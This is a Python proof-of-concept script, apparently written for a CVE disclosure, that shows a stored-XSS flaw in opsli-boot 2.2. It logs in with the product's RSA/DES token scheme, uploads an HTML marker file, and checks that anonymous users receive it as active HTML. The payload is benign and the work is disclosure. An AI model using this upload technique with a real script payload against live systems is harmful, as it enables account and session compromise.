#!/usr/bin/env python3
"""Non-destructive OPSLI HTML-upload stored-XSS proof.

The script authenticates with an explicitly supplied low-privilege account,
uploads a benign HTML marker, and retrieves it through a fresh unauthenticated
HTTP session. It never prints or persists the login token.
"""

from __future__ import annotations

import argparse
import base64
import json
import os
import sys
from pathlib import Path
from urllib.parse import urljoin

import requests
from Crypto.Cipher import DES, PKCS1_v1_5
from Crypto.PublicKey import RSA
from Crypto.Util.Padding import unpad


MARKER = "OPSLI_UPLOAD_HTML_EXECUTED"


def require_success(response: requests.Response, operation: str) -> dict:
    response.raise_for_status()
    body = response.json()
    if body.get("code") != 0:
        raise RuntimeError(f"{operation} failed: HTTP {response.status_code}: {body}")
    return body


def decrypt_access_token(login_body: dict, public_key_der: bytes) -> str:
    plain = unpad(
        DES.new(public_key_der[:8], DES.MODE_ECB).decrypt(
            base64.b64decode(login_body["data"])
        ),
        DES.block_size,
    )
    token = json.loads(plain).get("accessToken")
    if not token:
        raise RuntimeError("login response did not contain an access token")
    return token


def login(base: str, username: str, password: str) -> tuple[requests.Session, dict, str]:
    session = requests.Session()
    session.headers["User-Agent"] = "OPSLI-CVE-Proof/1.0"

    public_key_body = require_success(
        session.get(f"{base}/api/v1/common/public-key", timeout=15),
        "fetch public key",
    )
    public_key_der = base64.b64decode(public_key_body["data"])
    public_key = RSA.import_key(public_key_der)

    login_model = {
        "principal": username,
        "password": password,
        "verificationCode": "",
        "uuid": "",
        "loginFrom": "0",
    }
    encrypted_login = base64.b64encode(
        PKCS1_v1_5.new(public_key).encrypt(
            json.dumps(login_model, separators=(",", ":")).encode()
        )
    ).decode()
    login_body = require_success(
        session.post(
            f"{base}/system/login",
            json={"encryptData": encrypted_login},
            timeout=15,
        ),
        "login",
    )
    token = decrypt_access_token(login_body, public_key_der)
    identity = require_success(
        session.get(
            f"{base}/api/v1/system/user/getInfo",
            headers={"T-Authorization": token},
            timeout=15,
        ),
        "read identity",
    )["data"]
    return session, identity, token


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument(
        "--base",
        default=os.getenv("OPSLI_URL", "http://127.0.0.1:7000/opsli-boot"),
    )
    parser.add_argument("--username", default=os.getenv("OPSLI_USER", "songyi"))
    parser.add_argument("--password", default=os.getenv("OPSLI_PASS", "Aa123456."))
    parser.add_argument("--output", type=Path, default=Path("evidence.json"))
    args = parser.parse_args()

    base = args.base.rstrip("/")
    proof_path = Path(__file__).with_name("proof.html")
    proof_bytes = proof_path.read_bytes()
    if MARKER.encode() not in proof_bytes:
        raise RuntimeError(f"proof marker missing from {proof_path}")

    session, identity, token = login(base, args.username, args.password)
    if identity.get("izSuperAdmin") is True:
        raise RuntimeError("refusing to claim low privilege: test account is super admin")

    upload_body = require_success(
        session.post(
            f"{base}/api/v1/tools/oss/upload",
            headers={"T-Authorization": token},
            files={"file": ("cve-proof.html", proof_bytes, "text/html")},
            timeout=20,
        ),
        "upload HTML",
    )
    upload = upload_body["data"]
    uploaded_url = upload.get("fileStoragePath")
    if not uploaded_url:
        raise RuntimeError(f"upload response has no fileStoragePath: {upload_body}")
    uploaded_url = urljoin(base + "/", uploaded_url)

    with requests.Session() as anonymous:
        anonymous.headers["User-Agent"] = "OPSLI-CVE-Proof-anonymous/1.0"
        response = anonymous.get(uploaded_url, timeout=20)
    response.raise_for_status()
    content_type = response.headers.get("Content-Type", "")
    marker_present = MARKER.encode() in response.content
    is_html = content_type.split(";", 1)[0].strip().lower() == "text/html"

    if not is_html or not marker_present:
        raise RuntimeError(
            "anonymous retrieval did not return active HTML; "
            f"status={response.status_code}, content_type={content_type!r}, "
            f"marker_present={marker_present}"
        )

    evidence = {
        "product": "hiparker/opsli-boot",
        "version": "2.2",
        "username": identity.get("username"),
        "super_admin": identity.get("izSuperAdmin"),
        "upload_endpoint": f"{base}/api/v1/tools/oss/upload",
        "uploaded_url": uploaded_url,
        "anonymous_retrieval": {
            "status": response.status_code,
            "content_type": content_type,
            "marker_present": marker_present,
            "content_disposition": response.headers.get("Content-Disposition"),
        },
        "proof_file": proof_path.name,
        "safe": True,
    }
    args.output.write_text(
        json.dumps(evidence, indent=2, ensure_ascii=False) + "\n",
        encoding="utf-8",
    )

    print(
        f"[+] low-privilege identity: {evidence['username']} "
        f"(superAdmin={evidence['super_admin']})"
    )
    print(f"[+] uploaded URL: {uploaded_url}")
    print(f"[+] anonymous status: {response.status_code}")
    print(f"[+] content type: {content_type}")
    print(f"[+] marker present: {marker_present}")
    print(f"[+] evidence written: {args.output}")
    return 0 if identity.get("username") == args.username else 2


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"[-] {exc}", file=sys.stderr)
        raise SystemExit(1)
